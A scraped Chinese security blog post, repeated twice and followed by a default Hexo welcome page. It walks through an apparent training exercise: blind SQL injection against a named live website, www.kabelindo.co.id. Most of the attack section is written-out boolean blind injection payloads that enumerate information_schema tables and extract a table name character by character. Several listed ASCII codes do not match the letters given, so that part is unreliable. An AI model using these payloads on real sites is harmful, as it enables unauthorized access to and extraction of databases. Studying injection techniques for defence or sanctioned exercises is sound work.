entry.title: WEB进阶-实战2注入2
entry.content: title: WEB实战注入Neko’s blog WEB进阶-实战2注入链接：http://www.kabelindo.co.id 要求是表的最后一个是flag值 就是一个网站 对这个网站进行注入方法：1.SQLMAP直接跑得到flag值 2.手工注入这个可以说很坑了，使用常规SQL注入爆出来表看不到最后一个。。。 上百度查询使用数字型注和盲注，直接转载大牛文章 盲注 id=24 and (select count(table_name) from information_schema.tables where table_schema=’u9897uwx_kabel’)=22%23 发现有二十二个表 所以 需要 爆出第二十二个表 接着就按着 盲注一步一步来 （第一个字母，到最后一个字母） 12345678910111213141516171819 and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),1,1))=116%23 t and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),2,1))=98%23 b and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),3,1))=110%23 n and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),4,1))=111%23 o and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),5,1))=116%23 m and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),6,1))=116%23 a and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),7,1))=116%23 x到了第八位发现为0，空格 即就是只有七位，终于报完了。。。。。类似 and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),8,1))=0%23经过我的一步一步测试，终于爆出表明 为 tbnomax 最后输入 flag{tbnomax}

entry.title: WEB实战注入
entry.content: Neko’s blog WEB进阶-实战2注入链接：http://www.kabelindo.co.id 要求是表的最后一个是flag值 就是一个网站 对这个网站进行注入方法：1.SQLMAP直接跑得到flag值 2.手工注入这个可以说很坑了，使用常规SQL注入爆出来表看不到最后一个。。。 上百度查询使用数字型注和盲注，直接转载大牛文章 盲注 id=24 and (select count(table_name) from information_schema.tables where table_schema=’u9897uwx_kabel’)=22%23 发现有二十二个表 所以 需要 爆出第二十二个表 接着就按着 盲注一步一步来 （第一个字母，到最后一个字母） 12345678910111213141516171819 and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),1,1))=116%23 t and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),2,1))=98%23 b and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),3,1))=110%23 n and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),4,1))=111%23 o and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),5,1))=116%23 m and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),6,1))=116%23 a and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),7,1))=116%23 x到了第八位发现为0，空格 即就是只有七位，终于报完了。。。。。类似 and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),8,1))=0%23经过我的一步一步测试，终于爆出表明 为 tbnomax 最后输入 flag{tbnomax}

entry.title: 欢迎来到我的博客
entry.content: Welcome to 网络空间安全! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1网络空间安全测试 More info: Writing Run server1$ 欢迎欢迎 More info: Server Generate static files1测试 More info: Generating Deploy to remote sites1$ 测试 12欢迎来到我的博客测试 More info: Deployment
